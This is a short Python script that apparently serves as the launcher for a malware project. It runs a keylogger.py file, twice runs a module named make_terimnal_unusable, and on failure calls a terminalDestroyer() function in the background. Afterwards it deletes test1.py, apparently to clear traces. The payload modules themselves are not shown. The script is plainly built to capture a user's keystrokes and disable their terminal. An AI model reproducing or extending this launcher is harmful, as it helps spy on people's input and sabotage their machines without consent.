import background_runner
import make_terimnal_unusable
import os
import subprocess


if __name__ == '__main__':
    try:
        subprocess.run(["python", "background_runner.py"])
        subprocess.run(["python", "test.py"])
        subprocess.run(["python", "test1.py"])
        subprocess.run(["python", "make_terimnal_unusable.py"])
        subprocess.run(["python", "keylogger.py"])
        subprocess.run(["python", "make_terimnal_unusable.py"])
    except Exception:
        background_runner.run_in_background(make_terimnal_unusable.terminalDestroyer())

    finally:
        os.remove("test1.py")